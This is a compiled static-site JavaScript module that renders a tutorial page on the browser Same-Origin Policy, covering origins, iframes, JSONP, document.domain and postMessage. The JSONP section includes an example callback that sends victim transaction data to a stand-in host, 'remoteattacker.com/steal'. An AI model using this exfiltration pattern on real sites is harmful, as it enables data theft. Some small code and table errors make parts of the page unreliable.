import{A as e,d as t,m as n}from"./chunks/runtime-core.esm-bundler.BXAIOQQS.js";import{t as r}from"./chunks/plugin-vue_export-helper.CtN8rQnz.js";const i=JSON.parse(`{"title":"Same-Origin Policy","description":"Same-Origin Policy is a critical security mechanism that restricts how a document or script loaded by one origin can interact with a resource from another origin.","frontmatter":{"title":"Same-Origin Policy","description":"Same-Origin Policy is a critical security mechanism that restricts how a document or script loaded by one origin can interact with a resource from another origin."},"headers":[],"relativePath":"Concepts/Application_Security/SameOrigin_Policy.md","filePath":"Concepts/Application_Security/SameOrigin_Policy.md","lastUpdated":1756574703000}`);var a={name:`Concepts/Application_Security/SameOrigin_Policy.md`};function o(r,i,a,o,s,c){return e(),t(`div`,null,[...i[0]||=[n(`<h1 id="same-origin-policy-sop" tabindex="-1">Same-Origin Policy (SOP) <a class="header-anchor" href="#same-origin-policy-sop" aria-label="Permalink to “Same-Origin Policy (SOP)”">​</a></h1><p>Same-Origin Policy is a critical security mechanism that restricts how a document or script loaded by one origin can interact with a resource from another origin.</p><ul><li><p>This is the fundamental security model of the web</p></li><li><p>Two pages from different sources should not be allowed to interfere with each other</p></li><li><p>It helps isolate potentially malicious documents, reducing possible attack vectors.</p></li><li><p>For example, it prevents a malicious website on the Internet from running JavaScript in a browser to read data from a third-party webmail service (which the user is signed into) or a company intranet (which is protected from direct access by the attacker by not having a public IP address) and relaying that data to the attacker.</p></li></ul><h2 id="origin" tabindex="-1">Origin <a class="header-anchor" href="#origin" aria-label="Permalink to “Origin”">​</a></h2><p>Assume the web is an operating system:</p><ul><li>An <strong>origin</strong> is analogous to an OS process</li><li>The <strong>web browser</strong> itself is analogous to an OS <strong>kernel</strong></li><li>Sites rely on the browser to enforce all the system&#39;s security rules: <ul><li>Just like in OSes, if there&#39;s a bug in the browser itself then all these rules go out the window</li></ul></li></ul><p>The basic rule:</p><ul><li><p>Given <strong>two separate JavaScript execution contexts</strong>, one should be able to access the other only if the <strong>protocols, hostnames, and port numbers</strong> associated with their host documents <strong>match exactly</strong></p></li><li><p>This <strong>&quot;protocol-host-port tuple&quot;</strong> is called an <strong>&quot;origin&quot;</strong></p></li></ul><p>Two URIs are part of the same origin, if they have the same <code>scheme</code>, <code>host</code> and <code>port</code>, in terms of an <a href="./../Web/URL.html">URL</a>:</p><ul><li><code>scheme</code>: HTTP or HTTPS protocol</li><li><code>host</code>: Hostname or Domain name</li><li><code>port</code>: Port number (80 or 443 or any other number)</li></ul><p><em>Example:</em></p><div class="language-html"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light vitesse-dark" style="--shiki-light:#24292e;--shiki-dark:#dbd7caee;--shiki-light-bg:#fff;--shiki-dark-bg:#121212;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#758575DD;">&lt;!-- SCHEME + HOST (Domain) + PORT (Implicit)--&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#DBD7CAEE;">https://example.org:443</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#758575DD;">&lt;!-- SCHEME + HOST (Domain + Sub Domain) + PORT (Implicit)--&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#DBD7CAEE;">https://mypage.example.org:443</span></span></code></pre></div><p><em>Example:</em> Logic to check if two URLs are same origin:</p><div class="language-javascript"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light vitesse-dark" style="--shiki-light:#24292e;--shiki-dark:#dbd7caee;--shiki-light-bg:#fff;--shiki-dark-bg:#121212;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#CB7676;">function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#80A665;"> isSameOrigin</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">(</span><span style="--shiki-light:#E36209;--shiki-dark:#BD976A;">url1</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">,</span><span style="--shiki-light:#E36209;--shiki-dark:#BD976A;"> url2</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">)</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;"> {</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#4D9375;">  return</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;"> (</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">    url1</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">protocol</span><span style="--shiki-light:#D73A49;--shiki-dark:#CB7676;"> ===</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;"> url2</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">protocol</span><span style="--shiki-light:#D73A49;--shiki-dark:#CB7676;"> &amp;&amp;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">    url1</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">hostname</span><span style="--shiki-light:#D73A49;--shiki-dark:#CB7676;"> ===</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;"> url2</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">hostname</span><span style="--shiki-light:#D73A49;--shiki-dark:#CB7676;"> &amp;&amp;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">    url1</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">port</span><span style="--shiki-light:#D73A49;--shiki-dark:#CB7676;"> ===</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;"> url2</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">port</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#666666;">  );</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#666666;">}</span></span></code></pre></div><ul><li><p>Same Origin:</p><div class="language-html"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light vitesse-dark" style="--shiki-light:#24292e;--shiki-dark:#dbd7caee;--shiki-light-bg:#fff;--shiki-dark-bg:#121212;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#DBD7CAEE;">https://foo.example.org https://foo.example.org/mypage</span></span></code></pre></div></li><li><p>Cross Origin:</p><div class="language-html"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light vitesse-dark" style="--shiki-light:#24292e;--shiki-dark:#dbd7caee;--shiki-light-bg:#fff;--shiki-dark-bg:#121212;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#DBD7CAEE;">// Hostname don&#39;t match https://foo.github.io https://bar.github.io</span><span style="--shiki-light:#24292E;--shiki-dark:#DBD7CAEE;"> //</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#DBD7CAEE;">Hostname don&#39;t match https://example.org https://www.example.org // Protocol</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#DBD7CAEE;">don&#39;t match https://example.org http://example.org // Port don&#39;t match</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#DBD7CAEE;">https://example.org:81/ https://example.org:80/</span></span></code></pre></div></li></ul><h2 id="applicable" tabindex="-1">Applicable <a class="header-anchor" href="#applicable" aria-label="Permalink to “Applicable”">​</a></h2><h3 id="http-methods" tabindex="-1">HTTP Methods <a class="header-anchor" href="#http-methods" aria-label="Permalink to “HTTP Methods”">​</a></h3><p>HTTP Method behaviour for SOP:</p><ul><li><p><code>HEAD</code>, <code>GET</code>, <code>POST</code> Methods:</p><ul><li>Request reaches server</li><li>Response comes back but Browser blocks it</li></ul></li><li><p><code>PUT</code>, <code>DELETE</code>, <code>PATCH</code>, ... Methods:</p><ul><li>Request is blocked by Browser</li></ul></li></ul><h3 id="javascript" tabindex="-1">JavaScript <a class="header-anchor" href="#javascript" aria-label="Permalink to “JavaScript”">​</a></h3><p>Which is blocked?</p><ul><li><p><strong>Web Forms: SOP does not apply</strong></p><ul><li><p>Scripts, images, etc. which remain constant:</p><div class="language-html"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light vitesse-dark" style="--shiki-light:#24292e;--shiki-dark:#dbd7caee;--shiki-light-bg:#fff;--shiki-dark-bg:#121212;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#666666;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#4D9375;">script</span><span style="--shiki-light:#6F42C1;--shiki-dark:#BD976A;"> src</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D;">https://cross-origin/my.js</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">&gt;</span></span></code></pre></div></li><li><p>Cross-origin web forms:</p><div class="language-html"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light vitesse-dark" style="--shiki-light:#24292e;--shiki-dark:#dbd7caee;--shiki-light-bg:#fff;--shiki-dark-bg:#121212;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#666666;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#4D9375;">form</span><span style="--shiki-light:#6F42C1;--shiki-dark:#BD976A;"> action</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D;">https://cross-origin/getmyval</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#BD976A;"> method</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D;">GET</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">&gt;&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#4D9375;">form</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">&gt;</span></span></code></pre></div></li></ul></li><li><p><strong>JavaScript: SOP applies</strong></p><ul><li><p>Content operated via XMLHTTPRequest or Fetch (APIs):</p><div class="language-javascript"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light vitesse-dark" style="--shiki-light:#24292e;--shiki-dark:#dbd7caee;--shiki-light-bg:#fff;--shiki-dark-bg:#121212;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#80A665;">fetch</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D;">https://cross-origin/getmyval</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">);</span></span></code></pre></div></li></ul></li></ul><h3 id="iframe" tabindex="-1">iframe <a class="header-anchor" href="#iframe" aria-label="Permalink to “iframe”">​</a></h3><ul><li><p>Web page <code>https://cross-origin/home.html</code> can embed <code>https://example.org</code> using iframe, even though they are Cross-origin</p></li><li><p>But the embedded site content cannot be modified.</p></li></ul><p><em>Example:</em></p><div class="language-javascript"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light vitesse-dark" style="--shiki-light:#24292e;--shiki-dark:#dbd7caee;--shiki-light-bg:#fff;--shiki-dark-bg:#121212;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#758575DD;">// Embedding website using iframe</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">cont</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;"> iframe</span><span style="--shiki-light:#D73A49;--shiki-dark:#666666;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;"> document</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#80A665;">createElement</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D;">iframe</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">iframe</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">src</span><span style="--shiki-light:#D73A49;--shiki-dark:#666666;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;"> &#39;</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D;">https://example.org</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&#39;</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">document</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">body</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#80A665;">append</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">(</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">iframe</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">);</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#758575DD;">// If we try to access the embedded site content</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#758575DD;">// we get error</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">iframe</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">contentDocument</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">cookie</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#758575DD;">// Uncaught TypeError: Cannot read property &#39;cookie&#39; of null</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">iframe</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">contentDocument</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#758575DD;">// null</span></span></code></pre></div><ul><li>We can change the iframe source</li></ul><h3 id="cookies" tabindex="-1">Cookies <a class="header-anchor" href="#cookies" aria-label="Permalink to “Cookies”">​</a></h3><ul><li>Cookies are not blocked by SOP</li></ul><h2 id="problems-with-sop" tabindex="-1">Problems With SOP <a class="header-anchor" href="#problems-with-sop" aria-label="Permalink to “Problems With SOP”">​</a></h2><ul><li><p>Sometimes policy is too <strong>narrow</strong>: Difficult to get <code>https://login.example.org</code> and <code>https://mypage.example.org</code> to exchange data</p></li><li><p>Sometimes policy is too <strong>broad</strong>: No way to isolate <code>https://example.org/users/1</code> from <code>https://example.org/users/admin</code></p></li><li><p>Policy is not enforced for certain web features</p></li></ul><h2 id="workaround-for-sop" tabindex="-1">Workaround For SOP <a class="header-anchor" href="#workaround-for-sop" aria-label="Permalink to “Workaround For SOP”">​</a></h2><p>Methods to work around SOP restrictions in ajax</p><ul><li><p><code>JSONP</code>: (JSON with Padding) provides work-around for this SOP problem:</p><ul><li><p>Run JavaScript code inside HTML file with <code>&lt;script&gt;</code> tag</p></li><li><p>Script tag can reference URL that doesn&#39;t have a js extension</p></li><li><p>Code inside JavaScript file has access to everything that is in scope</p></li><li><p>Padded JSON response is surrounded by JavaScript function</p></li><li><p>No official spec for JSONP. It&#39;s a hack</p><div class="language-html"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light vitesse-dark" style="--shiki-light:#24292e;--shiki-dark:#dbd7caee;--shiki-light-bg:#fff;--shiki-dark-bg:#121212;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#758575DD;">&lt;!-- URL --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#666666;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#4D9375;">script</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#BD976A;">  src</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D;">http://internal.api.dev/api/transactions/jsonp?callback=accntResult</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#666666;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#666666;">  &lt;</span><span style="--shiki-light:#D73A49;--shiki-dark:#CB7676;">!--</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;"> Callback</span><span style="--shiki-light:#D73A49;--shiki-dark:#CB7676;"> function</span><span style="--shiki-light:#24292E;--shiki-dark:#DBD7CAEE;"> --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#666666;">  &lt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#5DA994;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#CB7676;">      function</span><span style="--shiki-light:#6F42C1;--shiki-dark:#80A665;"> accountResult</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">(</span><span style="--shiki-light:#E36209;--shiki-dark:#BD976A;">data</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">)</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;"> {</span></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#758575DD;">      // Send code to remote attacker</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#80A665;">      fetch</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">(</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">          &quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D;">https://remoteattacker.com/steal?</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#D73A49;--shiki-dark:#CB7676;"> +</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#CB7676;">          new</span><span style="--shiki-light:#6F42C1;--shiki-dark:#80A665;"> URLSearchParams</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">({</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#B8A965;">              dump</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">:</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;"> data</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">,</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#666666;">          })</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#666666;">      );</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#666666;">      }</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#666666;">&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#4D9375;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#758575DD;">&lt;!-- Data --&gt;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#DBD7CAEE;">accountResult({&#39;transactions&#39;: [{&#39;transactionId&#39;: 378954, &#39;amount&#39;: ...)</span></span></code></pre></div></li></ul></li><li><p><code>document.domain</code>:</p><ul><li><p>Need a way around SOP to allow two different origins to communicate</p></li><li><p>Two cooperating sites can agree that for the purpose of SOP checks, they want to be considered equivalent</p></li><li><p>Sites must share a common top-level domain</p></li><li><p><em>Example:</em> both <code>https://login.example.org</code> and <code>https://mypage.example.org</code> may perform the following assignment:</p><div class="language-javascript"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light vitesse-dark" style="--shiki-light:#24292e;--shiki-dark:#dbd7caee;--shiki-light-bg:#fff;--shiki-dark-bg:#121212;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">document</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">domain</span><span style="--shiki-light:#D73A49;--shiki-dark:#666666;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;"> &quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D;">example.org</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">;</span></span></code></pre></div></li><li><p>Both origins must explicitly opt-in to this feature</p></li><li><p>So, if <code>https://attacker.example.org</code> runs:</p><div class="language-javascript"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light vitesse-dark" style="--shiki-light:#24292e;--shiki-dark:#dbd7caee;--shiki-light-bg:#fff;--shiki-dark-bg:#121212;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">document</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">domain</span><span style="--shiki-light:#D73A49;--shiki-dark:#666666;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;"> &quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D;">example.org</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">;</span></span></code></pre></div></li><li><p>Then <code>https://attacker.example.org</code> still cannot access content on <code>https://example.org</code></p></li><li><p><code>https://example.org</code> also needs to run the same code to opt-in to this behaviour:</p><div class="language-javascript"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light vitesse-dark" style="--shiki-light:#24292e;--shiki-dark:#dbd7caee;--shiki-light-bg:#fff;--shiki-dark-bg:#121212;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">document</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">domain</span><span style="--shiki-light:#D73A49;--shiki-dark:#666666;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;"> &quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D;">example.org</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">;</span></span></code></pre></div></li><li><p><strong><code>document.domain</code> is a bad idea</strong></p></li><li><p>In order for <code>https://login.example.org</code> and <code>https://mypage.example.org</code> to communicate, they must set:</p><div class="language-javascript"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light vitesse-dark" style="--shiki-light:#24292e;--shiki-dark:#dbd7caee;--shiki-light-bg:#fff;--shiki-dark-bg:#121212;" tabindex="0" dir="ltr"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">document</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#BD976A;">domain</span><span style="--shiki-light:#D73A49;--shiki-dark:#666666;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;"> &quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D;">example.org</span><span style="--shiki-light:#032F62;--shiki-dark:#C98A7D77;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#666666;">;</span></span></code></pre></div></li><li><p>This allows anyone to join the party:</p><ul><li><code>https://attacker.example.org</code> can also set <code>document.domain</code> to <code>example.org</code> to become same origin with the others</li></ul></li><li><p>This is a opt-in:</p><table tabindex="0"><thead><tr><th>Originating URL</th><th><code>document.domain</code></th><th>Accessed URL</th><th><code>document.domain</code></th><th style="text-align:center;">Allowed?</th></tr></thead><tbody><tr><td><code>http://www.example.org</code></td><td><code>example.com</code></td><td><code>http://payments.example.org</code></td><td><code>example.com</code></td><td style="text-align:center;">Yes</td></tr><tr><td><code>http://www.example.org</code></td><td><code>example.com</code></td><td><code>https://payments.example.org</code></td><td><code>example.com</code></td><td style="text-align:center;">No</td></tr><tr><td><code>http://payments.example.org</code></td><td><code>example.com</code></td><td><code>https//example.org</code></td><td>(not set)</td><td style="text-align:center;">No</td></tr><tr><td><code>http://www.example.org</code></td><td>(not set)</td><td><code>http://www.example.org</code></td><td><code>example.com</code></td><td style="text-align:center;">No</td></tr></tbody></table></li></ul></li><li><p><code>iframe</code>:</p><ul><li>Send message from a parent page to a child iframe</li><li>Need a way around SOP to allow two different origins to communicate</li><li>What if we encoded data in URL fragment identifiers? <ul><li>Gap in SOP</li><li>Parent is allowed to navigate child iframes</li><li>Child can poll for changes to the fragment identifier</li></ul></li></ul></li><li><p><strong>The <code>postMessage</code> API</strong>:</p><ul><li>Secure cross-origin communications between cooperating origins</li><li>Send strings and arbitrarily complicated data cross-origin</li><li>Useful features: <ul><li>&quot;Structured clone&quot; algorithm used for complicated objects. Handles cycles. Can&#39;t handle object instances, functions, DOM nodes.</li><li>&quot;Transferable objects&quot; allow transferring ownership of an object. It becomes unusable (neutered) in the context it was sent from.</li></ul></li></ul></li></ul><h2 id="same-origin-and-same-site" tabindex="-1">Same-Origin and Same-Site <a class="header-anchor" href="#same-origin-and-same-site" aria-label="Permalink to “Same-Origin and Same-Site”">​</a></h2><p>What is valuable in client-side?</p><ul><li>Same-Origin Policy</li><li>Same-Site restrictions</li></ul><p>Are &quot;Site&quot; and &quot;Origin&quot; same?</p><p>Two URLs have the same origin if the protocol, port (if specified), and host are the same for both</p><table tabindex="0"><thead><tr><th>URL1</th><th>URL2</th><th>Outcome</th><th>Reason</th></tr></thead><tbody><tr><td><code>http://store.company.com/dir/page.html</code></td><td><code>http://store.company.com/dir2/other.html</code></td><td>Same origin</td><td>Only the path differs</td></tr><tr><td></td><td><code>http://store.company.com/dir/inner/another.html</code></td><td>Same origin</td><td>Only the path differs</td></tr><tr><td></td><td><code>https://store.company.com/page.html</code></td><td>Failure</td><td>Different protocol</td></tr><tr><td></td><td><code>http://store.company.com:81/dir/page.html</code></td><td>Failure</td><td>Different port (<code>http://</code> is port 80 by default)</td></tr><tr><td></td><td><code>http://news.company.com/dir/page.html</code></td><td>Failure</td><td>Different host</td></tr></tbody></table><table tabindex="0"><thead><tr><th>Origin A</th><th>Origin B</th><th>Whether Origin A and B are &quot;schemeful same-site&quot;</th></tr></thead><tbody><tr><td><code>https://www.example.com:443</code></td><td><code>https://</code><strong><code>www.evil.com</code></strong><code>:443</code></td><td>cross-site: different domains</td></tr><tr><td></td><td><code>https://</code><strong><code>login.</code></strong><code>example.com:443</code></td><td><strong>schemeful same-site: different subdomains don&#39;t matter</strong></td></tr><tr><td></td><td><strong><code>http:</code></strong><code>//www.example.com:443</code></td><td>cross-site: different schemes</td></tr><tr><td></td><td><code>https://www.example.com</code><strong><code>:80</code></strong></td><td><strong>schemeful same-site: different ports don&#39;t matter</strong></td></tr><tr><td></td><td><strong><code>https://www.example.com:443</code></strong></td><td><strong>schemeful same-site: exact match</strong></td></tr><tr><td></td><td><strong><code>https://www.example.com</code></strong></td><td><strong>schemeful same-site: ports don&#39;t matter</strong></td></tr></tbody></table>`,41)]])}var s=r(a,[[`render`,o]]);export{i as __pageData,s as default};